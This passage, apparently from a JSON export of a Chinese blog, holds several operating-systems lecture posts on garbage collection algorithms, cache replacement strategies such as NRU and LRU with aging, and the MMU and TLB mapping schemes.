如果你的程序内存需求较小，GC 压力小，这个时候每次用双色标记-清除算法，等彻底标记-清除完再执行应用程序，用户也不会感觉到多少延迟。双色标记-清除算法在这种场景可能会更加节省时间，因为程序简单。 对于一些对暂停时间不敏感的应用，比如说数据分析类应用，那么选择一个并发执行的双色标记-清除算法的 GC 引擎，是一个非常不错的选择。因为这种应用 GC 暂停长一点时间都没有关系，关键是要最短时间内把整个 GC 执行完成。 如果内存的需求大，同时对暂停时间也有要求，就需要三色标记清除算法，让部分增量工作可以并发执行。 如果在高并发场景，内存被频繁迭代，这个时候就需要生代算法。将内存划分出不同的空间，用作不同的用途。 如果实时性要求非常高，就需要选择专门针对实时场景的 GC 引擎，比如 Java 的 Z。 当然，并不是所有的语言都提供多款 GC 选择。但是通常每个语言都会提供很多的 GC 参数。这里也有一些最基本的思路，下面我为你介绍一下。 如果内存不够用，有两种解决方案。一种是降低吞吐量——相当于 GC 执行时间上升；另一种是增加暂停时间，暂停时间较长，GC 更容易集中资源回收内存。那么通常语言的 GC 都会提供设置吞吐量和暂停时间的 API。 如果内存够用，有的 GC 引擎甚至会选择当内存达到某个阈值之后，再启动 GC 程序。通常阈值也是可以调整的。因此如果内存够用，就建议让应用使用更多的内存，提升整体的效率。 总结那么通过这节课的学习，你现在可以尝试来回答本节关联的 2 道面试题目： 如何解决内存的循环引用问题？ 三色标记清除算法的工作原理？ 【解析】 解决循环引用的问题可以考虑利用 Root Tracing 类的 GC 算法。从根集合利用 DFS 或者 BFS 遍历所有子节点，最终不能和根集合连通的节点都是需要回收的。 三色标记算法利用三种颜色进行标记。白色代表需要回收的节点；黑色代表不需要回收的节点；灰色代表会被回收，但是没有完成标记的节点。 初始化的时候所有节点都标记为白色，然后利用 DFS 从 Root 集合遍历所有节点。每遍历到一个节点就把这个节点放入灰色集合，如果这个节点所有的子节点都遍历完成，就把这个节点放入黑色的集合。最后白色集合中剩下的就是需要回收的元素。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"内存回收上篇","slug":"计操/内存回收上篇","date":"2021-07-24T17:59:15.000Z","updated":"2021-07-25T07:08:35.591Z","comments":true,"path":"2021/07/25/计操/内存回收上篇/","link":"","permalink":"https://www.shanghua.live/2021/07/25/%E8%AE%A1%E6%93%8D/%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E4%B8%8A%E7%AF%87/","excerpt":"","text":"内存泄漏一直是很多大型系统故障的根源，也是一个面试热点。那么在编程语言层面已经提供了内存回收机制，为什么还会产生内存泄漏呢？ 这是因为应用的内存管理一直处于一个和应用程序执行并发的状态，如果应用程序申请内存的速度，超过内存回收的速度，内存就会被用满。当内存用满，操作系统就开始需要频繁地切换页面，进行频繁地磁盘读写。所以我们观察到的系统性能下降，往往是一种突然的崩溃，因为一旦内存被占满，系统性能就开始雪崩式下降。 特别是有时候程序员不懂内存回收的原理，错误地使用内存回收器，导致部分对象没有被回收。而在高并发场景下，每次并发都产生一点不能回收的内存，不用太长时间内存就满了，这就是泄漏通常的成因。 这一块知识点关联着很多常见的面试题，比如。 如何解决循环引用问题？ 三色标记-清除算法的工作原理？生代算法等。 还有一些题目会考察你对内存回收器整体的理解，比如如何在吞吐量、足迹和暂停时间之间选择？ 什么是 GC通常意义上我们说的垃圾回收器（Garbage Collector，GC），和多数同学的理解会有出入。你可能认为 GC 是做内存回收用的模块，而事实上程序语言提供的 GC 往往是应用的实际内存管理者。刚刚入门咱们就遇到了一个容易出现理解偏差的问题，所以 GC 是值得花时间细学的。 如上图所示，一方面 GC 要承接操作系统虚拟内存的架构，另一方面 GC 还要为应用提供内存管理。GC 有一个含义，就是 Garbage Collection 内存回收的具体动作。无论是名词的回收器，还是动词的回收行为，在下文中我都称作 GC。 下面我们具体来看一下 GC 都需要承担哪些“工作”，这里我总结为以下 4 种。 GC 要和操作系统进行交互，负责申请内存，并把不用的内存还给操作系统（释放内存）。 应用会向 GC 申请内存。 GC 要承担我们通常意义上说的垃圾回收能力，标记不用的对象，并回收他们。 GC 还需要针对应用特性进行动态的优化。 所以现在程序语言实现的 GC 模块通常是实际负责应用内存管理的模块。在程序语言实现 GC 的时候，会关注下面这几个指标。 吞吐量（Throughput）：执行程序（不包括 GC 执行的时间）和总是间的占比。注意这个吞吐量和通常意义上应用去处理作业的吞吐量是不一样的，这是从 GC 的角度去看应用。只要不在 GC，就认为是吞吐量的一部分。 足迹（FootPrint）： 一个程序使用了多少硬件的资源，也称作程序在硬件上的足迹。GC 里面说的足迹，通常就是应用对内存的占用情况。比如说应用运行需要 2G 内存，但是好的 GC 算法能够帮助我们减少 500MB 的内存使用，满足足迹这个指标。 暂停时间（Pause Time）： GC 执行的时候，通常需要停下应用（避免同步问题），这称为 Stop The World，或者暂停。不同应用对某次内存回收可以暂停的时间需求是不同的，比如说一个游戏应用，暂停了几毫秒用户都可能有很大意见；而看网页的用户，稍微慢了几毫秒是没有感觉的。 GC 目标的思考如果单纯从让 GC 尽快把工作做完的角度来讲，其实是提升吞吐量。比如利用好多核优势就是一种最直观的方法。 因为涉及并行计算，我这里给你讲讲并行计算领域非常重要的阿姆达定律，这个定律用来衡量并行计算对原有算法的改进，公式如下： S = 1 / (1- P) 你现在看到的是一个简化版的阿姆达定律，P 是任务中可以并发执行部分的占比，S 是并行带来的理论提速倍数的极限。比如说 P 是 0.9，代入公式可得： S = 1 / （1 - 0.9） = 10 上面表达式代表着有 90% 的任务可以并行，只有 10% 的任务不能够并行。假设我们拥有无限多的 CPU 去分担 90% 可以并行的任务，其实就相当于并行的任务可以在非常短的时间内完成。但是还有 10% 的任务不能并行，因此理论极限是 1/0.1=10 倍。 通常我们设计 GC，都希望它能够支持并行处理任务。因为 GC 本身也有着繁重的工作量，需要扫描所有的对象，对内存进行标记清除和整理等。 经过上述分析，那么我们在设计算法的时候是不是应该尽量做到高并发呢？ 很可惜并不是这样。如果算法支持的并发度非常高，那么和单线程算法相比，它也会带来更多的其他开销。比如任务拆分的开销、解决同步问题的开销，还有就是空间开销，GC 领域空间开销通常称为 FootPrint。理想情况下当然是核越多越好，但是如果考虑计算本身的成本，就需要找到折中的方案。 还有一个问题是，GC 往往不能拥有太长的暂停时间（Pause Time），因为 GC 和应用是并发的执行。如果 GC 导致应用暂停（Stop The World，STL）太久，那么对有的应用来说是灾难性的。 比如说你用鼠标的时候，如果突然卡了你会很抓狂。如果一个应用提供给百万级的用户用，假设这个应用帮每个用户每天节省了 1s 的等待时间，那么按照乔布斯的说法每天就为用户节省了 11 天的时间，每年是 11 年——5 年就相当于拯救了一条生命。 如果暂停时间只允许很短，那么 GC 和应用的交替就需要非常频繁。这对 GC 算法要求就会上升，因为每次用户程序执行后，会产生新的变化，甚至会对已有的 GC 结果产生影响。后面我们在讨论标记-清除算法的时候，你会感受到这种情况。 所以说，吞吐量高，不代表暂停时间少，也不代表空间使用（FootPrint）小。 同样的，使用空间小的 GC 算法，吞吐量反而也会下降。正因为三者之间存在类似相同成本代价下不可兼得的关系，往往编程语言会提供参数让你选择根据自己的应用特性决定 GC 行为。 引用计数算法（Reference Counter）接下来我们说说，具体怎么去实现 GC。实现 GC 最简单的方案叫作引用计数，下图中节点的引用计数是 2，代表有两个节点都引用了它。 如果一个节点的引用计数是 0，就意味着没有任何一个节点引用它——此时，理论上这个节点应该被回收。GC 不断扫描引用计数为 0 的节点进行回收，就构成了最简单的一个内存回收算法。 但是，这个算法可能会出现下图中循环引用的问题（我们写程序的过程中经常会遇到这样的引用关系）。下图中三个节点，因为循环引用，引用计数都是 1。 引用计数是 1，因此就算这 3 个对象不会再使用了，GC 不会回收它们。 另一个考虑是在多线程环境下引用计数的算法一旦算错 1 次（比如因为没有处理好竞争条件），那么就无法再纠正了。而且处理竞争条件本身也比较耗费性能。 还有就是引用计数法回收内存会产生碎片，当然碎片不是只有引用计数法才有的问题，所有的 GC 都需要面对碎片。下图中内存回收的碎片可以通过整理的方式，清理出更多空间出来。 综上，引用计数法出错概率大，比如我们编程时会有对象的循环引用；另一方面，引用计数法容错能力差，一旦计算错了，就会导致内存永久无法被回收，因此我们需要更好的方式。 Root Tracing 算法下面我再给你介绍一种更好的方式—— Root Tracing 算法。这是一类算法，后面我们会讲解的标记-清除算法和 3 色标记-清除算法都属于这一类。 Root Tracing 的原理是：从引用路径上，如果一个对象的引用链中包括一个根对象（Root Object），那么这个对象就是活动的。根对象是所有引用关系的源头。比如用户在栈中创建的对象指针；程序启动之初导入数据区的全局对象等。在 Java 中根对象就包括在栈上创建指向堆的对象；JVM 的一些元数据，包括 Method Area 中的对象等。 在 Root Tracing 工作过程中，如果一个对象和根对象间有连通路径，也就是从根节点开始遍历可以找到这个对象，代表有对象可以引用到这个对象，那么这个节点就不需要被回收。所以算法的本质还是引用，只不过判断条件从引用计数变成了有根对象的引用链。 如果一个对象从根对象不可达，那么这个对象就应该被回收，即便这个对象存在循环引用。可以看到，上图中红色的 3 个对象循环引用，并且到根集合没有引用链，因此需要被回收。这样就解决了循环引用的问题。 Root Tracing 的容错性很好，GC 通过不断地执行 Root Tracing 算法找到需要回收的元素。如果在这个过程中，有一些本来应该回收的元素没有被计算出（比如并发原因），也不会导致这些对象永久无法回收。因为在下次执行 Root Tracing 的时候，GC 就会通过执行 Root Tracing 算法找到这些元素。不像引用计数法，一旦算错就很难恢复。 标记-清除（Mark Sweep）算法下面我为你具体介绍一种 Root Tracing 的算法， 就是标记清除-算法。标记-清除算法中，用白色代表一种不确定的状态：可能被回收。 黑色代表一种确定的状态：不会被回收。算法的实现，就是为所有的对象染色。算法执行结束后，所有是白色的对象就需要被回收。 算法实现过程中，假设有两个全局变量是已知的： heapSet 中拥有所有对象 rootSet 中拥有所有 Root Object 算法执行的第一步，就是将所有的对象染成白色，代码如下： 123for obj in heapSet &#123; obj.color = white&#125; 12345678func mark(obj) &#123; if obj.color == white &#123; obj.color = black for v in references(obj) &#123; mark(v) &#125; &#125;&#125; 补充知识上面的 mark 函数对 obj 进行了深度优先搜索。深度优先搜索，就是自然的递归序。随着递归函数执行，遇到子元素就遍历子元素，就构成了天然的深度优先搜索。还有一个相对的概念是广度优先搜索（Breadth First Serach），如果你不知道深度优先搜索和广度优先搜索，可以看下我下面的图例。 上图中，深度优先搜索优先遍历完整的子树（递归），广度优先搜索优先遍历所有的子节点（逐层）。 然后我们从所有的 Root Object 开始执行 mark 函数： 123for root in rootSet &#123; mark(root)&#125; 以上程序执行结束后，所有和 Root Object 连通的对象都已经被染成了黑色。然后我们遍历整个 heapSet 找到白色的对象进行回收，这一步开始是清除（Sweep）阶段，以上是标记（Mark）阶段。 12345for obj in heapSet &#123; if obj.color == white &#123; free(obj) &#125;&#125; 以上算法就是一个简单的标记-清除算法。相比引用计数，这个算法不需要维护状态。算法执行开始所有节点都被标记了一遍。结束的时候，算法找到的垃圾就被清除了。 算法有两个阶段，标记阶段（Mark），还有清除阶段（Sweep），因此被称为标记-清除算法。 这里请你思考：如果上面的 GC 程序在某个时刻暂停了下来，然后开始执行用户程序。如果用户程序删除了对某个已经标记为黑色对象的所有引用，用户程序没办法通知 GC 程序。这个节点就会变成浮动垃圾（Floating Garbage），需要等待下一个 GC 程序执行。 假设用户程序和 GC 交替执行，用户程序不断进行修改（Mutation），而 GC 不断执行标记-清除算法。那么这中间会产生大量浮动垃圾影响 GC 的效果。 另一方面，考虑到 GC 是一个非常消耗性能程序，在某些情况下，我们希望 GC 能够增量回收。 比如说，用户仅仅是高频删除了一部分对象，那么是否可以考虑设计不需要从整个 Root 集合进行遍历，而是增量的只处理最近这一批变更的算法呢？答案是可以的，我们平时可以多执行增量 GC，偶尔执行一次全量 GC。具体增量的方式会在下一讲为你讲解。 总结讨论到这里，相信你已经对 GC 有了一个大致的认识，但是具体到不同的场景如何设计 GC 算法，比如上面提到的标记-清除算法的缺陷，该如何去弥补呢？ 还有在高并发场景应该如何选择 GC 算法呢？当你拿到一个 GC 工具，又应该如何去设置参数，调整计算资源和存储资源比例呢？这些问题， 你可以先在自己脑海中思考，然后我会在下一讲为你讲解更好的方案。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"缓存置换算法","slug":"计操/缓存置换算法","date":"2021-07-24T16:49:16.000Z","updated":"2021-07-24T08:55:12.945Z","comments":true,"path":"2021/07/25/计操/缓存置换算法/","link":"","permalink":"https://www.shanghua.live/2021/07/25/%E8%AE%A1%E6%93%8D/%E7%BC%93%E5%AD%98%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/","excerpt":"","text":"LRU（最近最少使用），是一种缓存置换算法。缓存是用来存储常用的数据，加速常用数据访问的数据结构。有软件实现，比如数据库的缓存；也有硬件实现，比如我们上一讲学的 TLB。缓存设计中有一个重要的环节：当缓存满了，新的缓存条目要写入时，哪个旧条目被置换出去呢？ 这就需要用到缓存置换算法（Cache Replacement Algorithm）。缓存置换应用场景非常广，比如发生缺页中断后，操作系统需要将磁盘的页导入内存，那么已经在内存中的页就需要置换出去。CDN 服务器为了提高访问速度，需要决定哪些 Web 资源在内存中，哪些在磁盘上。CPU 缓存每次写入一个条目，也就相当于一个旧的条目被覆盖。数据库要决定哪些数据在内存中，应用开发要决定哪些数据在 Redis 中，而空间是有限的，这些都关联着缓存的置换。 理想状态设计缓存置换算法的期望是：每次将未来使用频率最低的数据置换出去。假设只要我们知道未来的所有指令，就可以计算出哪些内存地址在未来使用频率高，哪些内存地址在未来使用频率低。这样，我们总是可以开发出理论上最高效的缓存置换算法。 再复习下缓存的基本概念，在缓存中找到数据叫作一次命中（Hit），没有找到叫作穿透（Miss）。假设穿透的概率为 M，缓存的访问时间（通常叫作延迟）是 L，穿透的代价（访问到原始数据，比如 Redis 穿透，访问到 DB）也就是穿透后获取数据的平均时间是 T，那么 M*T+L 可以看作是接近缓存的平均响应时间。L 通常是不变的，这个和我们使用了什么缓存相关。这样，如果我们知道未来访问数据的顺序，就可以把 M 降到最低，让缓存平均响应时间降到最低。 当然这只是美好的愿望，在实际工作中我们还不可能预知未来。 随机/FIFO/FILO接下来我要和你讨论的 3 种策略，是对理想状态的一种悲观表达，或者说不好的设计。 比如说随机置换，一个新条目被写入，随机置换出去一个旧条目。这种设计，具有非常朴素的公平，但是性能会很差（穿透概率高），因为可能置换出去未来非常需要的数据。 再比如先进先出（First In First Out）。设计得不好的电商首页，每次把离现在时间最久的产品下线，让新产品有机会展示，而忽略销量、热度、好评等因素。这也是一种朴素的公平，但是和我们设计缓存算法的初衷——预估未来使用频率更高的数据保留在缓存中，相去甚远。所以，FIFO 的结构也是一种悲观的设计。 FIFO 的结构使用一个链表就能实现，如下图所示： 为了方便你理解本讲后面的内容，我在这里先做一个知识铺垫供你参考。上图中，新元素从链表头部插入，旧元素从链表尾部离开。 这样就构成了一个队列（Queue），队列是一个经典的 FIFO 模型。 还有一种策略是先进后出（First In Last Out）。但是这种策略和 FIFO、随机一样，没有太强的实际意义。因为先进来的元素、后进来的元素，还是随机的某个元素，和我们期望的未来使用频率，没有任何本质联系。 同样 FILO 的策略也可以用一个链表实现，如下图所示： 新元素从链表头部插入链表，旧元素从链表头部离开链表，就构成了一个栈（Stack），栈是一种天然的 FILO 数据结构。这里仅供参考了，我们暂时还不会用到这个方法。 当然我们不可能知道未来，但是可以考虑基于历史推测未来。经过前面的一番分析，接下来我们开始讨论一些更有价值的置换策略。 最近未使用（NRU）一种非常简单、有效的缓存实现就是优先把最近没有使用的数据置换出去（Not Recently Used）。从概率上说，最近没有使用的数据，未来使用的概率会比最近经常使用的数据低。缓存设计本身也是基于概率的，一种方案有没有价值必须经过实践验证——在内存缺页中断后，如果采用 NRU 置换页面，可以提高后续使用内存的命中率，这是实践得到的结论。 在页表中有一个访问位，代表页表有被读取过。还有一个脏位，代表页表被写入过。无论是读还是写，我们都可以认为是访问过。 为了提升效率，一旦页表被使用，可以用硬件将读位置 1，然后再设置一个定时器，比如 100ms 后，再将读位清 0。当有内存写入时，就将写位置 1。过一段时间将有内存写入的页回写到磁盘时，再将写位清 0。这样读写位在读写后都会置为 1，过段时间，也都会回到 0。 上面这种方式，就构成了一个最基本的 NRU 算法。每次置换的时候，操作系统尽量选择读、写位都是 0 的页面。而一个页面如果在内存中停留太久，没有新的读写，读写位会回到 0，就可能会被置换。 这里多说一句，NRU 本身还可以和其他方法结合起来工作，比如我们可以利用读、写位的设计去改进 FIFO 算法。 每次 FIFO 从队列尾部找到一个条目要置换出去的时候，就检查一下这个条目的读位。如果读位是 0，就删除这个条目。如果读位中有 1，就把这个条目从队列尾部移动到队列的头部，并且把读位清 0，相当于多给这个条目一次机会，因此也被称为第二次机会算法。多给一次机会，就相当于发生访问的页面更容易存活。而且，这样的算法利用天然的数据结构优势（队列），保证了 NRU 的同时，节省了去扫描整个缓存寻找读写位是 0 的条目的时间。 第二次机会算法还有一个更巧妙的实现，就是利用循环链表。这个实现可以帮助我们节省元素从链表尾部移动到头部的开销。 如上图所示，我们可以将从尾部移动条目到头部的这个操作简化为头指针指向下一个节点。每次移动链表尾部元素到头部，只需要操作头指针指向下一个元素即可。这个方法非常巧妙，而且容易实现，你可以尝试在自己系统的缓存设计中尝试使用它。 以上，是我们学习的第一个比较有价值的缓存置换算法。基本可用，能够提高命中率。缺点是只考虑了最近用没用过的情况，没有充分考虑综合的访问情况。优点是简单有效，性能好。缺点是考虑不周，对缓存的命中率提升有限。但是因为简单，容易实现，NRU 还是成了一个被广泛使用的算法。 最近使用最少（LRU）一种比 NRU 考虑更周密，实现成本更高的算法是最近最少使用（Least Recently Used， LRU）算法，它会置换最久没有使用的数据。和 NRU 相比，LRU 会考虑一个时间范围内的数据，对数据的参考范围更大。LRU 认为，最近一段时间最少使用到的数据应该被淘汰，把空间让给最近频繁使用的数据。这样的设计，即便数据都被使用过，还是会根据使用频次多少进行淘汰。比如：CPU 缓存利用 LUR 算法将空间留给频繁使用的内存数据，淘汰使用频率较低的内存数据。 常见实现方案LRU 的一种常见实现是链表，如下图所示： 用双向链表维护缓存条目。如果链表中某个缓存条目被使用到，那么就将这个条目重新移动到表头。如果要置换缓存条目出去，就直接从双线链表尾部删除一个条目。 通常 LRU 缓存还要提供查询能力，这里我们可以考虑用类似 Java 中 LinkedHashMap 的数据结构，同时具备双向链表和根据 Key 查找值的能力。 以上是常见的实现方案，但是这种方案在缓存访问量非常大的情况下，需要同时维护一个链表和一个哈希表，因此开销较高。 举一个高性能场景的例子，比如页面置换算法。 如果你需要维护一个很大的链表来存储所有页，然后经常要删除大量的页面（置换缓存），并把大量的页面移动到链表头部。这对于页面置换这种高性能场景来说，是不可以接受的。 另外一个需要 LRU 高性能的场景是 CPU 的缓存，CPU 的多路组相联设计，比如 8-way 设计，需要在 8 个地址中快速找到最久未使用的数据，不可能再去内存中建立一个链表来实现。 正因为有这么多困难，才需要不断地优化迭代，让缓存设计成为一门艺术。接下来我选取了内存置换算法中数学模拟 LRU 的算法，分享给你。 如何描述最近使用次数？设计 LRU 缓存第一个困难是描述最近使用次数。 因为“最近”是一个模糊概念，没有具体指出是多长时间？按照 CPU 周期计算还是按照时间计算？还是用其他模糊的概念替代？ 比如说页面置换算法。在实际的设计中，可以考虑把页表的读位利用起来。做一个定时器，每隔一定的 ms 数，就把读位累加到一个计数器中。相当于在每个页表条目上再增加一个累计值。 例如：现在某个页表条目的累计值是 0， 接下来在多次计数中看到的读位是：1,0,0,1,1，那么累计值就会变成 3。这代表在某段时间内（5 个计数器 Tick 中）有 3 次访问操作。 通过这种方法，就解决了描述使用次数的问题。如果单纯基于使用次数最少判断置换，我们称为最少使用（Least Frequently Used,，LFU）算法。LFU 的劣势在于它不会忘记数据，累计值不会减少。比如如果有内存数据过去常常被用到，但是现在已经有很长一段时间没有被用到了，在这种情况下它并不会置换出去。那么我们该如何描述“最近”呢？ 有一个很不错的策略就是利用一个叫作“老化”（Aging）的算法。比起传统的累加计数的方式，Aging 算法的累加不太一样。 比如用 8 位来描述累计数（A），那么每次当读位的值（R）到来的时候，我们都考虑将 A 的值右移，然后将 R 放到 A 的最高位。 例如 A 目前的值是00000000，在接下来的 5 个 Tick 中 R 来临的序列是11100，那么 A 的值变更顺序为： 123451000000011000000111000000111000000111000 你可以看到随着 Aging 算法的执行，有访问操作的时候 A 的值上升，没有访问操作的时候，A的值逐渐减少。如果一直没有访问操作，A 的值会回到 0。 这样的方式就巧妙地用数学描述了“最近”。然后操作系统每次页面置换的时候，都从 A 值最小的集合中取出一个页面放入磁盘。这个算法是对 LRU 的一种模拟，也被称作 LFUDA（动态老化最少使用，其中 D 是 Dynamic,，A 是 Aging）。 而计算 Aging（累计值）的过程，可以由硬件实现，这样就最大程度提升了性能。 相比写入操作，查询是耗时相对较少的。这是因为有 CPU 缓存的存在，我们通常不用直接去内存中查找数据，而是在缓存中进行。对于发生缺页中断的情况，并不需要追求绝对的精确，可以在部分页中找到一个相对累计值较小的页面进行置换。不过即便是模拟的 LRU 算法，也不是硬件直接支持的，总有一部分需要软件实现，因此还是有较多的时间开销。 是否采用 LRU，一方面要看你所在场景的性能要求，有没有足够的优化措施（比如硬件提速）；另一方面，就要看最终的结果是否能够达到期望的命中率和期望的使用延迟了。 总结本讲我们讨论的频次较高、频次较低，是基于历史的。 历史在未来并不一定重演。比如读取一个大型文件，无论如何操作都很难建立一个有效的缓存。甚至有的时候，最近使用频次最低的数据被缓存，使用频次最高的数据被置换，效率会更高。比如说有的数据库设计同时支持 LRU 缓存和 MRU（ Most Recently Used）缓存。MRU 是 LRU 的对立面，这看似茅盾，但其实是为了解决不同情况下的需求。 这并不是说缓存设计无迹可寻，而是经过思考和预判，还得以事实的命中率去衡量缓存置换算法是否合理。 那么通过这节课的学习，你现在可以尝试来回答本节关联的面试题目：LRU 用什么数据结构实现更合理？ 【解析】 最原始的方式是用数组，数组的每一项中有数据最近的使用频次。数据的使用频次可以用计时器计算。每次置换的时候查询整个数组实现。 另一种更好的做法是利用双向链表实现。将使用到的数据移动到链表头部，每次置换时从链表尾部拿走数据。链表头部是最近使用的，链表尾部是最近没有被使用到的数据。 但是在应对实际的场景的时候，有时候不允许我们建立专门用于维护缓存的数据结构（内存大小限制、CPU 使用限制等），往往需要模拟 LRU。比如在内存置换场景有用“老化”技术模拟 LRU 计算的方式。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"内存管理单元","slug":"计操/内存管理单元","date":"2021-07-24T16:19:52.000Z","updated":"2021-07-24T08:33:00.889Z","comments":true,"path":"2021/07/25/计操/内存管理单元/","link":"","permalink":"https://www.shanghua.live/2021/07/25/%E8%AE%A1%E6%93%8D/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%8D%95%E5%85%83/","excerpt":"","text":"内存管理单元上一讲我们学习了虚拟地址到物理地址的转换过程。如下图所示： 你可以把虚拟地址看成由页号和偏移量组成，把物理地址看成由 Frame Number 和偏移量组成。在 CPU 中有一个完成虚拟地址到物理地址转换的小型设备，叫作内存管理单元（Memory Management Unit(MMU）。 在程序执行的时候，指令中的地址都是虚拟地址，虚拟地址会通过 MMU，MMU 会查询页表，计算出对应的 Frame Number，然后偏移量不变，组装成真实地址。然后 MMU 通过地址总线直接去访问内存。所以 MMU 承担了虚拟地址到物理地址的转换以及 CPU 对内存的操作这两件事情。 如下图所示，从结构上 MMU 在 CPU 内部，并且直接和地址总线连接。因此 MMU 承担了 CPU 和内存之间的代理。对操作系统而言，MMU 是一类设备，有多种型号，就好比显卡有很多型号一样。操作系统需要理解这些型号，会使用 MMU。 TLB 和 MMU 的性能问题上面的过程，会产生一个问题：指令的执行速度非常快，而 MMU 还需要从内存中查询页表。最快的内存查询页需要从 CPU 的缓存中读取，假设缓存有 95% 的命中率，比如读取到 L2 缓存，那么每次操作也需要几个 CPU 周期。你可以回顾一下 CPU 的指令周期，如下图所示，有 fetch/decode/execute 和 store。 在 fetch、execute 和 store 这 3 个环节中都有可能发生内存操作，因此内存操作最好能在非常短的时间内完成，尤其是 Page Number 到 Frame Number 的映射，我们希望尽快可以完成，最好不到 0.2 个 CPU 周期，这样就不会因为地址换算而增加指令的 CPU 周期。 因此，在 MMU 中往往还有一个微型的设备，叫作转置检测缓冲区（Translation Lookaside Buffer，TLB）。 缓存的设计，通常是一张表，所以 TLB 也称作快表。TLB 中最主要的信息就是 Page Number到 Frame Number 的映射关系。 page number Frame Number 如上表所示，最简单的表达就是一个二维表格，每一行是一个 Page Number 和一个 Frame Number。我们把这样的每一行称为一个缓存行（Cache Line），或者缓存条目（Entry）。 TLB 的作用就是根据输入的 Page Number，找到 Frame Number。TLB 是硬件实现的，因此速度很快。因为用户的局部程序，往往会反复利用相同的内存地址。比如说 for 循环会反复利用循环变量，因此哪怕是只有几十个缓存行的 TLB，也会有非常高的命中率。而且现在的多核 CPU，会为每个核心提供单独的 TLB。这样，相当于减少了 TLB 的冲突。比如酷睿 i7 CPU 当中，每个核心都有自己的 TLB，而且 TLB 还进行了类似 CPU 缓存的分级策略。在 i7 CPU 中，L1 级 TLB 一共 64 个，L2 级 TLB 一共 1024 个。通过这样的设计，绝大多数的页表查询就可以用 TLB 实现了。 TLB Miss 问题如果 Page Number 在 TLB 总没有找到，我们称为TLB 失效（Miss）。这种情况，分成两种。 一种是软失效（Soft Miss），这种情况 Frame 还在内存中，只不过 TLB 缓存中没有。那么这个时候需要刷新 TLB 缓存。如果 TLB 缓存已经满了，就需要选择一个已经存在的缓存条目进行覆盖。具体选择哪个条目进行覆盖，我们称为缓存置换（缓存不够用了，需要置换）。缓存置换时，通常希望高频使用的数据保留，低频使用的数据被替换。比如常用的 LRU（Least Recently Used）算法就是基于这种考虑，每次置换最早使用的条目。 另一种情况是硬失效（Hard Miss)，这种情况下对应的 Frame 没有在内存中，需要从磁盘加载。这种情况非常麻烦，首先操作系统要触发一个缺页中断（原有需要读取内存的线程被休眠），然后中断响应程序开始从磁盘读取对应的 Frame 到内存中，读取完成后，再次触发中断通知更新 TLB，并且唤醒被休眠的线程去排队。注意，线程不可能从休眠态不排队就进入执行态，因此 Hard Miss 是相对耗时的。 无论是软失效、还是硬失效，都会带来性能损失，这是我们不希望看到的。因此缓存的设计，就非常重要了。 TLB 缓存的设计每个缓存行可以看作一个映射，TLB 的缓存行将 Page Number 映射到 Frame Number，通常我们设计这种基于缓存行（Cache Line）的缓存有 3 种映射方案： 全相联映射（Fully Associative Mapping） 直接映射（Direct Mapping） n 路组相联映射（n-way Set-Associative Mapping） 所谓相联（Associative），讲的是缓存条目和缓存数据之间的映射范围。如果是全相联，那么一个数据，可能在任何条目。如果是组相联（Set-Associative），意味对于一个数据，只能在一部分缓存条目中出现（比如前 4 个条目）。 方案一：全相联映射（Fully Associative Mapping）如果 TLB 用全相联映射实现，那么一个 Frame，可能在任何缓存行中。虽然名词有点复杂，但是通常新人设计缓存时，会本能地想到全相联。因为在给定的空间下，最容易想到的就是把缓存数据都放进一个数组里。 对于 TLB 而言，如果是全相联映射，给定一个具体的 Page Number，想要查找 Frame，需要遍历整个缓存。当然作为硬件实现的缓存，如果缓存条目少的情况下，可以并行查找所有行。这种行为在软件设计中是不存在的，软件设计通常需要循环遍历才能查找行，但是利用硬件电路可以实现这种并行查找到过程。可是如果条目过多，比如几百个上千个，硬件查询速度也会下降。所以，全相联映射，有着明显性能上的缺陷。我们不考虑采用。 方案二：直接映射（Direct Mapping）对于水平更高一些的同学，马上会想到直接映射。直接映射类似一种哈希函数的形式，给定一个内存地址，可以通过类似于哈希函数计算的形式，去计算它在哪一个缓存条目。假设我们有 64 个条目，那么可以考虑这个计算方法：缓存行号 = Page Number % 64。 当然在这个方法中，假如实际的虚拟地址空间大小是 1G，页面大小是 4K，那么一共有 1G/4K = 262144 个页，平均每 262144/64 = 4096 个页共享一个条目。这样的共享行为是很正常的，本身缓存大小就不可能太大，之前我们讲过，性能越高的存储离 CPU 越近，成本越高，空间越小。 上面的设计解决了全相联映射的性能缺陷，那么缓存命中率如何呢？ 一种最简单的思考就是能不能基于直接映射实现 LRU 缓存。仔细思考，其实是不可能实现的。因为当我们想要置换缓存的时候（新条目进来，需要寻找一个旧条目出去），会发现每次都只有唯一的选择，因为对于一个确定的虚拟地址，它所在的条目也是确定的。这导致直接映射不支持各种缓存置换算法，因此 TLB Miss 肯定会更高。 综上，我们既要解决直接映射的缓存命中率问题，又希望解决全相联映射的性能问题。而核心就是需要能够实现类似 LRU 的算法，让高频使用的缓存留下来——最基本的要求，就是一个被缓存的值，必须可以存在于多个位置——于是人们就发明了 n 路组相联映射。 方案三：n 路组相联映射（n-way Set-Associative Mapping）组相联映射有点像哈希表的开放寻址法，但是又有些差异。组相联映射允许一个虚拟页号（Page Number）映射到固定数量的 n 个位置。举个例子，比如现在有 64 个条目，要查找地址 100 的位置，可以先用一个固定的方法计算，比如 100%64 = 36。这样计算出应该去条目 36 获取 Frame 数据。但是取出条目 36 看到条目 36 的 Page Number 不是 100，这个时候就顺延一个位置，去查找 37,38,39……如果是 4 路组相联，那么就只看 36,37,38,39，如果是8 路组相联，就只看 36-43 位置。 这样的方式，一个 Page Number 可以在 n 个位置出现，这样就解决了 LRU 算法的问题。每次新地址需要置换进来的时候，可以从 n 个位置中选择更新时间最早的条目置换出去。至于具体 n 设置为多少，需要实战的检验。而且缓存是一个模糊、基于概率的方案，本身对 n 的要求不是很大。比如：i7 CPU 的 L1 TLB 采用 4-way 64 条目的设计；L2 TLB 采用 8-way 1024 条目的设计。Intel 选择了这样的设计，背后有大量的数据支撑。这也是缓存设计的一个要点，在做缓存设计的时候，你一定要收集数据实际验证。 